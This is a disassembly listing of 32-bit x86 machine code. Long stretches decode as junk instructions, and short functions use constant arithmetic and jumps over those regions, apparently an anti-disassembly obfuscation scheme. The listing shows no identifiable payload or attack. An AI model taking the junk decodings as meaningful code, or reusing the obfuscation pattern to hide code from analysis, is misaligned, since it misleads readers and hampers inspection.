  410ca6:	arpl   WORD PTR [ebx+ebp*8-0x11],cx
  410caa:	loope  0x410c47
  410cac:	in     al,0x85
  410cae:	int    0xf5
  410cb0:	ja     0x410d1e
  410cb2:	sub    al,0x56
  410cb4:	pop    ebp
  410cb5:	aas    
  410cb6:	and    BYTE PTR [edx+ebp*1],dl
  410cb9:	inc    ebp
  410cba:	push   0x22
  410cbc:	loope  0x410cac
  410cbe:	xlat   BYTE PTR ds:[ebx]
  410cbf:	cdq    
  410cc0:	outs   dx,DWORD PTR ds:[esi]
  410cc1:	mov    ah,0x9f
  410cc3:	lds    edi,FWORD PTR [edx]
  410cc5:	fs add eax,ebp
  410cc8:	mov    al,0x1a
  410cca:	fadd   DWORD PTR [edi-0x78]
  410ccd:	sbb    BYTE PTR [edi+0x7bf0e0c4],0x55
  410cd4:	pop    ecx
  410cd5:	iret   
  410cd6:	and    ebp,DWORD PTR [ecx+0x179bd50a]
  410cdc:	outs   dx,DWORD PTR ds:[esi]
  410cdd:	inc    ebp
  410cde:	es (bad) 
  410ce0:	mov    cl,bh
  410ce2:	sub    al,0x65
  410ce4:	icebp  
  410ce5:	dec    esp
  410ce6:	or     eax,0x3cff28b1
  410ceb:	mov    cl,0x70
  410ced:	outs   dx,BYTE PTR ds:[esi]
  410cee:	mov    ebp,0x5cd72930
  410cf3:	ss push ebp
  410cf5:	mov    ds:0x77d65b18,al
  410cfa:	xchg   BYTE PTR [ebx+0x10],cl
  410cfd:	je     0x410c86
  410cff:	push   esi
  410d00:	and    eax,DWORD PTR [ebx+0x6b]
  410d03:	or     ch,cl
  410d05:	dec    ebp
  410d06:	dec    ecx
  410d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d08:	xchg   esp,eax
  410d09:	sbb    BYTE PTR [edi],0x3c
  410d0c:	pusha  
  410d0d:	lea    ecx,[esi+0x77]
  410d10:	scas   al,BYTE PTR es:[edi]
  410d11:	push   esp
  410d12:	jmp    0x410d5f
  410d14:	and    eax,0xa908dc0f
  410d19:	pop    eax
  410d1a:	ror    bl,1
  410d1c:	bound  eax,QWORD PTR [ebx]
  410d1e:	or     eax,0xad5b0622
  410d23:	add    BYTE PTR [edi-0x14c149c4],cl
  410d29:	adc    esi,DWORD PTR [ebp+0x183c6c04]
  410d2f:	add    eax,0x4c753894
  410d34:	jecxz  0x410d23
  410d36:	out    dx,eax
  410d37:	mov    dh,0xe2
  410d39:	pop    ecx
  410d3a:	jnp    0x410d70
  410d3c:	xchg   DWORD PTR [ecx],edx
  410d3e:	xchg   DWORD PTR [edi+0x11],esp
  410d41:	sub    ah,BYTE PTR [edi-0x18]
  410d44:	dec    edx
  410d45:	in     eax,dx
  410d46:	adc    eax,0x22922c86
  410d4b:	jmp    0x3b88d826
  410d50:	pop    ecx
  410d51:	mov    cl,0x20
  410d53:	mov    DWORD PTR [edi+0x1f],esi
  410d56:	popa   
  410d57:	or     eax,0xa575cd2b
  410d5c:	lea    ebx,[edx]
  410d5e:	test   al,0x30
  410d60:	in     eax,dx
  410d61:	(bad)  
  410d62:	jge    0x410dd2
  410d64:	popa   
  410d65:	int    0xc4
  410d67:	shr    esi,1
  410d69:	inc    esp
  410d6a:	mov    eax,gs
  410d6c:	sbb    dh,BYTE PTR [ebx-0x3c713164]
  410d72:	sub    al,0x68
  410d74:	xor    dl,BYTE PTR [eax+0x7e525959]
  410d7a:	adc    ch,BYTE PTR [ebp+0x42]
  410d7d:	mov    BYTE PTR [esp+esi*1+0x4c],dl
  410d81:	dec    ecx
  410d82:	js     0x410d5d
  410d84:	popf   
  410d85:	inc    edi
  410d86:	sbb    eax,0xf1276463
  410d8b:	add    al,0xb7
  410d8d:	out    0x77,eax
  410d8f:	add    al,0x4a
  410d91:	mov    al,ds:0x3e476cfa
  410d96:	je     0x410e07
  410d98:	outs   dx,BYTE PTR ds:[esi]
  410d99:	or     al,0x22
  410d9b:	hlt    
  410d9c:	sub    DWORD PTR [ecx+edi*4+0x77e8d0aa],0xc89a3ef7
  410da7:	lahf   
  410da8:	xchg   esp,eax
  410da9:	add    DWORD PTR [edi],0xe
  410dac:	lods   eax,DWORD PTR ds:[esi]
  410dad:	dec    eax
  410dae:	mov    cl,0x4b
  410db0:	xchg   edx,eax
  410db1:	pop    es
  410db2:	adc    ah,BYTE PTR [esi]
  410db4:	sub    DWORD PTR [esi],ecx
  410db6:	jl     0x410d8c
  410db8:	cmp    BYTE PTR [edi],0xd2
  410dbb:	fild   WORD PTR [ebx-0x4bf17ba]
  410dc1:	xchg   edx,eax
  410dc2:	(bad)  
  410dc3:	retf   0xcbad
  410dc6:	sbb    BYTE PTR [edx+ebx*4],al
  410dc9:	sub    al,0xdc
  410dcb:	mov    al,BYTE PTR [edx]
  410dcd:	das    
  410dce:	sahf   
  410dcf:	aad    0x65
  410dd1:	ficom  WORD PTR [esi]
  410dd3:	rcr    BYTE PTR [ebx-0x64b258f7],cl
  410dd9:	(bad)  
  410ddb:	xchg   edi,eax
  410ddc:	adc    DWORD PTR [eax+ebx*4],esp
  410ddf:	scas   al,BYTE PTR es:[edi]
  410de0:	shl    ecx,0xe2
  410de3:	imul   esi,DWORD PTR [eax],0xfffffff8
  410de6:	mov    cl,0xe5
  410de8:	sahf   
  410de9:	push   ecx
  410dea:	xchg   ebp,eax
  410deb:	push   ebx
  410dec:	mov    DWORD PTR [eax+0x4],edx
  410def:	pop    ebx
  410df0:	leave  
  410df1:	ret    0x8
  410df4:	push   ebp
  410df5:	mov    ebp,esp
  410df7:	sub    esp,0x3c
  410dfa:	mov    DWORD PTR [ebp-0x20],0x3510
  410e01:	mov    DWORD PTR [ebp-0x1c],0x2104
  410e08:	mov    DWORD PTR [ebp-0x18],0x5d15
  410e0f:	mov    DWORD PTR [ebp-0x14],0x30cd
  410e16:	mov    DWORD PTR [ebp-0x10],0x1709
  410e1d:	mov    DWORD PTR [ebp-0xc],0x260b
  410e24:	jmp    0x4110ab
  410e29:	jo     0x410db5
  410e2b:	fldl2e 
  410e2d:	cmp    al,0xb9
  410e2f:	jo     0x410dcd
  410e31:	out    0x46,eax
  410e33:	mov    ah,BYTE PTR [esi+ebp*1+0x3bdd0226]
  410e3a:	dec    edx
  410e3b:	mov    esi,0xbec289be
  410e40:	mov    esi,0x8cd55755
  410e45:	mov    eax,ds:0x1e512156
  410e4a:	mov    ecx,0x4fe3bf25
  410e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e50:	lock add eax,0x5914bbff
  410e56:	sbb    DWORD PTR [edi],eax
  410e58:	addr16 daa 
  410e5a:	sahf   
  410e5b:	jge    0x410e5c
  410e5d:	(bad)  
  410e5f:	aam    0x7d
  410e61:	xor    eax,0x294e214f
  410e66:	outs   dx,BYTE PTR ds:[esi]
  410e67:	outs   dx,BYTE PTR ds:[esi]
  410e68:	shl    DWORD PTR [ebx+0x4b0c2138],0x20
  410e6f:	jg     0x410e8e
  410e71:	cmp    DWORD PTR [ecx+0x25dae1ff],0xffffffbe
  410e78:	stos   BYTE PTR es:[edi],al
  410e79:	fst    QWORD PTR [edx+ecx*1-0xa]
  410e7d:	xchg   ecx,eax
  410e7e:	push   esi
  410e7f:	cwde   
  410e80:	lahf   
  410e81:	sbb    al,0x44
  410e83:	jmp    0x27feaa4e
  410e88:	xlat   BYTE PTR ds:[ebx]
  410e89:	aad    0xf6
  410e8b:	(bad)  
  410e8c:	in     eax,0xba
  410e8e:	and    al,0xa9
  410e90:	aas    
  410e91:	out    dx,al
  410e92:	and    esp,DWORD PTR [ebx]
  410e94:	ret    0xc9a7
  410e97:	add    DWORD PTR [ecx],ebp
  410e99:	ins    BYTE PTR es:[edi],dx
  410e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e9b:	cmovno edi,DWORD PTR [edx+0x4b]
  410e9f:	add    BYTE PTR [ecx+edi*4],bh
  410ea2:	aad    0x6d
  410ea4:	cmp    DWORD PTR [ebx+0x6336130c],edx
  410eaa:	addr16 inc ebp
  410eac:	xor    edx,esp
  410eae:	jbe    0x410e4b
  410eb0:	cwde   
  410eb1:	push   esp
  410eb2:	cmp    bl,BYTE PTR [edi-0x12b9c922]
  410eb8:	dec    eax
  410eb9:	pusha  
  410eba:	or     eax,0x843227b9
  410ebf:	in     eax,dx
  410ec0:	mov    WORD PTR [eax+0x3a],?
  410ec3:	test   al,0x1e
  410ec5:	mov    esp,0xf7273bdd
  410eca:	loop   0x410eec
  410ecc:	lea    ebx,[ecx+0x5c]
  410ecf:	push   ss
  410ed0:	sub    al,0x3b
  410ed2:	neg    edx
  410ed4:	mov    ebp,0x7ad1f2f5
  410ed9:	loope  0x410ece
  410edb:	mov    ch,0x9c
  410edd:	inc    eax
  410ede:	aam    0x95
  410ee0:	sub    BYTE PTR [esi],bh
  410ee2:	popf   
  410ee3:	push   ecx
  410ee4:	fwait
  410ee5:	mov    cl,0x44
  410ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee9:	into   
  410eea:	and    BYTE PTR [esi-0x7198ca3c],0x61
  410ef1:	aas    
  410ef2:	jo     0x410f63
  410ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ef5:	rcr    ebp,1
  410ef7:	push   ebx
  410ef8:	fs mov edi,0x436eadf7
  410efe:	or     ah,BYTE PTR fs:[bx]
  410f02:	scas   al,BYTE PTR es:[edi]
  410f03:	jo     0x410f37
  410f05:	and    bl,ah
  410f07:	pop    es
  410f08:	out    dx,al
  410f09:	retf   
  410f0a:	(bad)  
  410f0c:	iret   
  410f0d:	outs   dx,BYTE PTR ds:[esi]
  410f0e:	cmp    eax,0x571a2164
  410f13:	dec    eax
  410f14:	sub    edx,edi
  410f16:	mov    ss,WORD PTR [ebx-0x1e2e5a28]
  410f1c:	cmp    al,al
  410f1e:	rol    BYTE PTR [ebx+0x8],0xb0
  410f22:	loopne 0x410eae
  410f24:	xchg   ecx,eax
  410f25:	sub    ah,BYTE PTR [esi+edi*2]
  410f28:	scas   eax,DWORD PTR es:[edi]
  410f29:	lock dec edx
  410f2b:	sahf   
  410f2c:	jb     0x410f68
  410f2e:	das    
  410f2f:	nop
  410f30:	mov    ch,0x1d
  410f32:	arpl   si,di
  410f34:	fist   WORD PTR [ebx-0x4e19d7e3]
  410f3a:	inc    esi
  410f3b:	imul   esi,esi,0xffffffe8
  410f3e:	jecxz  0x410f7c
  410f40:	out    dx,eax
  410f41:	jge    0x410f4e
  410f43:	push   ecx
  410f44:	jae    0x410fa8
  410f46:	imul   edx,DWORD PTR [edx-0x25527e11],0xffffff96
  410f4d:	pop    ss
  410f4e:	mov    bh,0x8d
  410f50:	lock (bad) 
  410f52:	fisttp QWORD PTR [ecx-0x6b681724]
  410f58:	cmp    eax,0x584d3e1d
  410f5d:	fnsave [ebx]
  410f5f:	popf   
  410f60:	mov    esi,DWORD PTR [ecx-0x7cd74541]
  410f66:	in     al,0xf5
  410f68:	mov    bh,0x81
  410f6a:	push   cs
  410f6b:	xor    DWORD PTR [ebp+0x69],0x2db2dd34
  410f72:	retf   0xa610
  410f75:	out    0x1,eax
  410f77:	mov    bh,0x46
  410f79:	mov    al,ds:0x351c65ca
  410f7e:	jp     0x410fad
  410f80:	fwait
  410f81:	mov    edx,0xd37e12cb
  410f86:	iret   
  410f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f89:	or     al,0x3d
  410f8b:	sub    al,0x83
  410f8d:	xor    cl,BYTE PTR [esi-0x6a]
  410f90:	xor    al,0xec
  410f92:	adc    DWORD PTR [ebx+0x26de40c2],esp
  410f98:	shr    bl,1
  410f9a:	push   ebp
  410f9b:	int3   
  410f9c:	mov    ds:0xade7bc29,al
  410fa1:	mov    edx,0x7ae9876
  410fa6:	push   esi
  410fa7:	and    BYTE PTR [edi],dl
  410fa9:	push   ss
  410faa:	mov    ds:0xa39d88b9,eax
  410faf:	out    0x3e,eax
  410fb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fb2:	out    dx,al
  410fb3:	icebp  
  410fb4:	das    
  410fb5:	inc    eax
  410fb6:	xchg   edx,eax
  410fb7:	pushf  
  410fb8:	adc    al,BYTE PTR es:0x35b00fe2
  410fbf:	aas    
  410fc0:	icebp  
  410fc1:	pop    ebx
  410fc2:	push   0x5c
  410fc4:	sub    eax,0xb2c88407
  410fc9:	push   eax
  410fca:	mov    eax,ds:0x52a14f1c
  410fcf:	lock mov ecx,0xb73cbaa0
  410fd5:	scas   al,BYTE PTR es:[edi]
  410fd6:	or     BYTE PTR [edx+eax*1-0x59f943b6],dh
  410fdd:	add    DWORD PTR [ecx+0x74429c25],esi
  410fe3:	push   ecx
  410fe4:	std    
  410fe5:	pusha  
  410fe6:	mov    al,0xaf
  410fe8:	sub    ebp,DWORD PTR [ebp+0x23]
  410feb:	and    dl,ch
  410fed:	ds das 
  410fef:	mov    al,ds:0xb7e572dd
  410ff4:	jge    0x410ff9
  410ff6:	retf   0x22a0
  410ff9:	or     eax,0xa6aee2c5
  410ffe:	ins    BYTE PTR es:[edi],dx
  410fff:	jno    0x411021
  411001:	xor    dh,cl
  411003:	cs call 0x326b:0x57f85254
  41100b:	adc    DWORD PTR [edi+0x8],0xffffffb9
  41100f:	shr    BYTE PTR [ebx],cl
  411011:	popf   
  411012:	mov    bh,BYTE PTR [edi+eax*8+0x16]
  411016:	sub    DWORD PTR [ebp-0x29],edi
  411019:	pop    edx
  41101a:	push   0x47
  41101c:	test   eax,0xa975f385
  411021:	fnstenv [ebx-0x39]
  411024:	(bad)  
  411026:	icebp  
  411027:	cmp    BYTE PTR ds:0xeb1806d4,ch
  41102d:	sbb    DWORD PTR [edi+edx*2],0x71
  411031:	sub    bh,BYTE PTR [ecx]
  411033:	stos   DWORD PTR es:[edi],eax
  411034:	add    al,0x1a
  411036:	mov    cl,0x22
  411038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411039:	addr16 lock or al,0x2b
  41103d:	and    BYTE PTR [ecx-0x5],0x1d
  411041:	lods   al,BYTE PTR ds:[esi]
  411042:	addr16 jle 0x410fe6
  411045:	sub    bl,bh
  411047:	cmp    ebx,DWORD PTR [esi-0x51]
  41104a:	dec    edx
  41104b:	adc    DWORD PTR [ebx],0x801e6bcc
  411051:	mov    es,WORD PTR [eax+0x37a99e40]
  411057:	je     0x4110a4
  411059:	push   ecx
  41105a:	popa   
  41105b:	mov    esp,0xf9e09899
  411060:	loopne 0x41101d
  411062:	cmp    ch,BYTE PTR [esi]
  411064:	fwait
  411065:	inc    esi
  411066:	jp     0x410fed
  411068:	pop    eax
  411069:	push   es
  41106a:	mov    ch,0xdc
  41106c:	push   ebp
  41106d:	mov    es,esp
  41106f:	in     eax,0x1a
  411071:	push   esi
  411072:	jle    0x41103a
  411074:	jg     0x4110ef
  411076:	mov    edx,0xb1efd23
  41107b:	in     al,dx
  41107c:	dec    edx
  41107d:	cmc    
  41107e:	ds jae 0x411062
  411081:	sub    ebp,ebx
  411083:	pop    ebp
  411084:	aas    
  411085:	(bad)  
  411087:	ja     0x411074
  411089:	inc    eax
  41108a:	shl    BYTE PTR [edx-0xa],cl
  41108d:	cs push edx
  41108f:	jle    0x4110f8
  411091:	aam    0x44
  411093:	push   edx
  411094:	aas    
  411095:	add    al,BYTE PTR [ebx-0x675b12d9]
  41109b:	retf   0x4c88
  41109e:	stos   DWORD PTR es:[edi],eax
  41109f:	leave  
  4110a0:	popa   
  4110a1:	sbb    eax,0x89d6367b
  4110a6:	cli    
  4110a7:	and    DWORD PTR [ebp-0x46],ebp
  4110aa:	dec    eax
  4110ab:	mov    DWORD PTR [ebp-0x8],0x3204
  4110b2:	mov    DWORD PTR [ebp-0x4],0x62ea
  4110b9:	mov    DWORD PTR [ebp-0x38],0x58e9
  4110c0:	jmp    0x411347
  4110c5:	pop    edx
  4110c6:	daa    
  4110c7:	fcomp  QWORD PTR [eax-0x44]
  4110ca:	mov    esp,0xf3ba2b5a
  4110cf:	aad    0xe3
  4110d1:	pop    ss
  4110d2:	loop   0x41107c
  4110d4:	jecxz  0x4110de
  4110d6:	dec    esi
  4110d7:	mov    esi,0xbec289be
  4110dc:	mov    esi,0x92626ced
  4110e1:	sub    eax,0xdbf1bfee
  4110e6:	ficom  DWORD PTR [ebx-0x36]
  4110e9:	pusha  
  4110ea:	push   es
  4110eb:	pop    esp
  4110ec:	leave  
  4110ed:	repz sbb ch,0x34
  4110f1:	mov    al,ds:0x2f64313e
  4110f6:	jo     0x41116c
  4110f8:	inc    esp
  4110f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110fa:	xchg   edi,eax
  4110fb:	out    0xec,al
  4110fd:	xlat   BYTE PTR ds:[ebx]
  4110fe:	push   ebp
  4110ff:	sub    DWORD PTR [esi-0x6a],esi
  411102:	addr16 loope 0x4110bc
  411105:	xchg   esi,eax
  411106:	(bad)  
  411107:	imul   ebx,esp,0x31d75554
  41110d:	daa    
  41110e:	inc    ebp
  41110f:	inc    ebp
  411110:	ss jbe 0x41111b
  411113:	xlat   BYTE PTR ds:[ebx]
  411114:	repz cwde 
  411116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411117:	ins    DWORD PTR es:[edi],dx
  411118:	sbb    bh,BYTE PTR [ebx]
  41111a:	stos   DWORD PTR es:[edi],eax
  41111b:	xchg   esi,eax
  41111c:	mov    esp,0xe10d3531
  411121:	mov    al,0x71
  411123:	and    BYTE PTR [eax+0x76b1a61],dh
  411129:	dec    DWORD PTR [ebp+ebp*2-0x252fe542]
  411130:	daa    
  411131:	inc    ebp
  411132:	lods   al,BYTE PTR ds:[esi]
  411133:	(bad)  
  411134:	and    ebp,edi
  411136:	add    eax,0x5271686b
  41113b:	cmp    ebx,ebx
  41113d:	dec    ebp
  41113e:	imul   ebx,DWORD PTR [eax+0x71],0x5d02a479
  411145:	(bad)  
  411146:	ins    DWORD PTR es:[edi],dx
  411147:	pop    ss
  411148:	shl    ch,cl
  41114a:	mov    edi,0xdb7d9418
  41114f:	nop
  411150:	je     0x41111b
  411152:	or     eax,0x379e7a59
  411157:	inc    ecx
  411158:	xchg   ecx,eax
  411159:	and    eax,0xc1de06a6
  41115e:	or     bl,BYTE PTR [edi+0x2fc49f91]
  411164:	scas   al,BYTE PTR es:[edi]
  411165:	ja     0x4111a9
  411167:	aam    0xc3
  411169:	ins    DWORD PTR es:[edi],dx
  41116a:	jge    0x411134
  41116c:	fistp  WORD PTR [edi]
  41116e:	imul   al
  411170:	scas   al,BYTE PTR es:[edi]
  411171:	(bad)  
  411172:	repz and ax,0x61ed
  411177:	dec    ecx
  411178:	inc    esi
  411179:	call   0xf7f2d302
  41117e:	and    BYTE PTR [ecx+ebx*2-0x603e66d6],ah
  411185:	jo     0x4111fd
  411187:	push   esp
  411188:	bound  edx,QWORD PTR [ebp-0x1dfbe5c8]
  41118e:	in     eax,0x48
  411190:	stc    
  411191:	mov    edx,0xc1d11924
  411196:	rcr    DWORD PTR [ecx+0x3f],cl
  411199:	mov    dl,0xca
  41119b:	adc    eax,DWORD PTR [edx+0x4930449]
  4111a1:	xor    DWORD PTR [ebx-0x2082f498],edi
  4111a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a8:	mov    ah,0x69
  4111aa:	pop    edi
  4111ab:	je     0x411185
  4111ad:	adc    eax,0x52b91bb3
  4111b2:	addr16 dec esp
  4111b4:	ins    DWORD PTR es:[edi],dx
  4111b5:	jmp    0xad66bf3c
  4111ba:	mov    bl,0xe2
  4111bc:	cdq    
  4111bd:	ret    0x5666
  4111c0:	mov    eax,ds:0x7ec2a344
  4111c5:	cs push cs
  4111c7:	mov    eax,ds:0xe19eb82b
  4111cc:	out    dx,al
  4111cd:	(bad)  
  4111ce:	fdivrp st(5),st
  4111d0:	xor    DWORD PTR [eax+0x3ac7b7bf],ebp
  4111d6:	mov    ch,0xc4
  4111d8:	ins    BYTE PTR es:[edi],dx
  4111d9:	mov    ch,0x6d
  4111db:	or     edx,esi
  4111dd:	les    ebx,FWORD PTR [esi-0x5c55ebb8]
  4111e3:	push   esi
  4111e4:	lods   eax,DWORD PTR ds:[esi]
  4111e5:	repz mov al,BYTE PTR [ebx]
  4111e8:	add    bl,BYTE PTR [eax]
  4111ea:	sub    eax,0x4e9b71d0
  4111f0:	xchg   esp,eax
  4111f1:	cmp    al,0x90
  4111f3:	pop    ebp
  4111f4:	into   
  4111f5:	in     al,dx
  4111f6:	outs   dx,BYTE PTR ds:[esi]
  4111f7:	jb     0x4111d3
  4111f9:	and    BYTE PTR [edx-0x31d202a7],0x16
  411200:	mov    BYTE PTR [ecx],ch
  411202:	xchg   ebp,eax
  411203:	cmp    al,0x5a
  411205:	adc    BYTE PTR [ebp+0x3e],ch
  411208:	push   edi
  411209:	pop    esp
  41120a:	jmp    FWORD PTR ds:0xec0f3cb1
  411210:	arpl   WORD PTR [esi+ebp*4-0x70],bp
  411214:	sar    DWORD PTR [edx-0x42],0x60
  411218:	test   DWORD PTR ds:0x2f4ccd55,edi
  41121e:	push   esi
  41121f:	sbb    BYTE PTR [ecx],al
  411221:	mov    eax,0xa666de09
  411226:	fist   WORD PTR [ebx-0x7b]
  411229:	lahf   
  41122a:	add    BYTE PTR [eax+0x5a],ch
  41122d:	shl    DWORD PTR [edi-0x52],1
  411230:	in     al,0x33
  411232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411233:	xchg   ebx,eax
  411234:	dec    ebx
  411235:	sbb    ah,BYTE PTR [ecx]
  411237:	mov    esi,DWORD PTR es:[edi+0xe09c13e]
  41123e:	(bad)  
  41123f:	clc    
  411240:	jns    0x411203
  411242:	cs stc 
  411244:	dec    edx
  411245:	jmp    0x4111fe
  411247:	ins    DWORD PTR es:[edi],dx
  411248:	clc    
  411249:	or     al,0xe0
  41124b:	dec    ecx
  41124c:	mov    edi,0x28362afb
  411251:	stc    
  411252:	fnstenv [ebx+esi*4]
  411255:	inc    ebp
  411256:	cdq    
  411257:	in     eax,0x15
  411259:	sbb    BYTE PTR [esi+0x1d910943],bh
  41125f:	and    eax,0x73f959b1
  411264:	pop    esp
  411265:	sub    al,0x92
  411267:	mov    ebx,0xaae3e152
  41126c:	mov    dh,0x10
  41126e:	scas   al,BYTE PTR es:[edi]
  41126f:	pop    es
  411270:	std    
  411271:	inc    esp
  411272:	jns    0x4112e4
  411274:	test   eax,0x6e951892
  411279:	sub    BYTE PTR [edi],dh
  41127b:	out    dx,al
  41127c:	in     al,0x5b
  41127e:	stos   BYTE PTR es:[edi],al
  41127f:	mov    dh,0x93
  411281:	ret    0x2a86
  411284:	sub    BYTE PTR ds:0x64b2f480,0xfc
  41128b:	into   
  41128c:	pop    esp
  41128d:	(bad)  
  41128e:	repz cmp al,0x80
  411291:	adc    BYTE PTR [ebp-0x74],dh
  411294:	aam    0xf7
  411296:	stc    
  411297:	mov    dh,0xf6
  411299:	test   al,0x1f
  41129b:	push   edx
  41129c:	sub    DWORD PTR [ecx-0x48],ebp
  41129f:	pop    edi
  4112a0:	pop    edi
  4112a1:	push   ecx
  4112a2:	mov    eax,0x4ef498b5
  4112a7:	fsubr  QWORD PTR [edx*4-0x7fe0d59a]
  4112ae:	or     BYTE PTR [eax-0x71],bl
  4112b1:	imul   ebx,ebp,0x5dd45ee5
  4112b7:	call   0xafb8:0xd9691463
  4112be:	push   esp
  4112bf:	js     0x41128b
  4112c1:	mov    ecx,0x79235c3d
  4112c6:	sub    DWORD PTR [ecx],ebx
  4112c8:	jmp    0x931b:0x26d1a6ca
  4112cf:	call   0x87c46e57
  4112d4:	mov    ebx,DWORD PTR [edi+ebx*2]
  4112d7:	xchg   dh,dh
  4112d9:	lods   al,BYTE PTR ds:[esi]
  4112da:	xor    eax,eax
  4112dc:	mov    ecx,0x22eff406
  4112e1:	mov    esp,0x7a74e490
  4112e6:	fistp  WORD PTR [edi+0x1c]
  4112e9:	add    BYTE PTR [ebx-0x40],dl
  4112ec:	push   eax
  4112ed:	call   0xd9530e8b
  4112f2:	(bad)  
  4112f3:	inc    ecx
  4112f4:	pop    edi
  4112f5:	pusha  
  4112f6:	push   ss
  4112f7:	dec    ecx
  4112f8:	mov    ch,0x87
  4112fa:	icebp  
  4112fb:	stos   BYTE PTR es:[edi],al
  4112fc:	out    dx,al
  4112fd:	push   edx
  4112fe:	cmc    
  4112ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411300:	mov    ?,WORD PTR [edi+0x63b8fd1e]
  411306:	imul   edi,DWORD PTR [ecx+0x566ca91b],0xffffffa9
  41130d:	in     eax,0x58
  41130f:	cdq    
  411310:	xchg   ecx,eax
  411311:	xchg   ebp,eax
  411312:	fbld   TBYTE PTR [edx]
  411314:	rcr    ch,0x1f
  411317:	arpl   sp,sp
  411319:	cmp    cl,BYTE PTR [ebp-0x3397c095]
  41131f:	xchg   DWORD PTR [ebx],edi
  411321:	jns    0x411322
  411323:	mov    ds:0x379d64b,al
  411328:	jbe    0x411324
  41132a:	ror    ecx,1
  41132c:	imul   eax,DWORD PTR [ecx+0x4da57555],0xfffffffa
  411333:	jb     0x4112e5
  411335:	neg    BYTE PTR [ebp-0x3e]
  411338:	xchg   esi,eax
  411339:	push   es
  41133a:	adc    BYTE PTR [edx],al
  41133c:	je     0x41134b
  41133e:	cmp    bh,0x7f
  411341:	mov    al,ds:0x7bbd93d0
  411346:	jbe    0x41130f
  411348:	inc    ebp
  411349:	int3   
  41134a:	mov    DWORD PTR [edi+0x0],edi
  41134d:	add    bh,al
  41134f:	inc    ebp
  411350:	rcr    dl,1
  411352:	jg     0x411354
  411354:	add    bh,al
  411356:	inc    ebp
  411357:	aam    0x89
  411359:	sub    BYTE PTR [eax],al
  41135b:	add    bh,al
  41135d:	inc    ebp
  41135e:	fmul   DWORD PTR [edi]
  411360:	sldt   WORD PTR [eax]
  411363:	mov    DWORD PTR [ebp-0x24],0x58e1
  41136a:	mov    DWORD PTR [ebp-0x3c],0x69c
  411371:	mov    eax,DWORD PTR [ebp-0x10]
  411374:	mov    ecx,DWORD PTR [ebp-0x14]
  411377:	and    al,0xb9
  411379:	add    al,cl
  41137b:	mov    ecx,DWORD PTR [ebp-0x18]
  41137e:	and    al,cl
  411380:	mov    ecx,DWORD PTR [ebp-0x1c]
  411383:	sub    al,0x11
  411385:	and    al,cl
  411387:	mov    ecx,DWORD PTR [ebp-0x20]
  41138a:	mov    edx,DWORD PTR [ebp+0x8]
  41138d:	imul   ecx,ecx,0x6008
  411393:	add    ecx,0x1759dd6e
  411399:	add    al,0x4d
  41139b:	xor    ecx,0x2b4185ee
  4113a1:	cmp    BYTE PTR [ecx+edx*1],al
  4113a4:	jne    0x41143e
  4113aa:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ad:	mov    eax,0xffffeff8
  4113b2:	mov    edx,eax
  4113b4:	sub    edx,ecx
  4113b6:	add    edx,DWORD PTR [ebp-0x8]
  4113b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4113bc:	or     edx,ecx
  4113be:	mov    ecx,DWORD PTR [ebp-0x4]
  4113c1:	imul   edx,edx,0x85300
  4113c7:	sub    eax,ecx
  4113c9:	add    eax,DWORD PTR [ebp-0x8]
  4113cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4113cf:	or     eax,ecx
  4113d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4113d4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  4113db:	add    eax,0x40e5
  4113e0:	imul   eax,eax,0x214c
  4113e6:	add    eax,ecx
  4113e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4113eb:	add    ecx,eax
  4113ed:	mov    DWORD PTR [ebp+0x8],ecx
  4113f0:	mov    eax,DWORD PTR [ebp-0x24]
  4113f3:	mov    ecx,DWORD PTR [ebp-0x28]
  4113f6:	and    eax,ecx
  4113f8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4113fb:	and    eax,ecx
  4113fd:	mov    ecx,DWORD PTR [ebp-0x30]
  411400:	imul   eax,ecx
  411403:	mov    ecx,DWORD PTR [ebp-0x34]
  411406:	or     eax,ecx
  411408:	mov    ecx,DWORD PTR [ebp-0x38]
  41140b:	imul   eax,ecx
  41140e:	mov    ecx,DWORD PTR [ebp+0x8]
  411411:	sub    eax,0x777ea653
  411416:	cmp    DWORD PTR [ecx+0x54],eax
  411419:	je     0x411427
  41141f:	mov    eax,DWORD PTR [ebp+0x8]
  411422:	jmp    0x41146e
  411427:	mov    eax,DWORD PTR [ebp-0x3c]
  41142a:	sub    eax,0x5258
  41142f:	xor    eax,0x49e9
  411434:	add    eax,0x253
  411439:	jmp    0x41146e
  41143e:	mov    DWORD PTR [ebp-0x3c],0x4177
  411445:	mov    DWORD PTR [ebp+0x8],0x1405
  41144c:	mov    eax,DWORD PTR [ebp+0x8]
  41144f:	mov    ecx,DWORD PTR [ebp-0x3c]
  411452:	imul   eax,eax,0x58cc
  411458:	add    eax,0x3f39
  41145d:	and    eax,ecx
  41145f:	add    eax,0x3b90
  411464:	or     eax,0x4b1c
  411469:	sub    eax,0x7fdd
  41146e:	leave  
  41146f:	ret    0x4
  411472:	push   ebp
  411473:	mov    ebp,esp
  411475:	and    esp,0xfffffff8
  411478:	sub    esp,0x20
  41147b:	push   ebx
  41147c:	push   esi
  41147d:	lea    eax,[esp+0x10]
  411481:	mov    DWORD PTR [esp+0xc],eax
  411485:	mov    eax,DWORD PTR [esp+0xc]
  411489:	mov    ecx,DWORD PTR [esp+0x10]
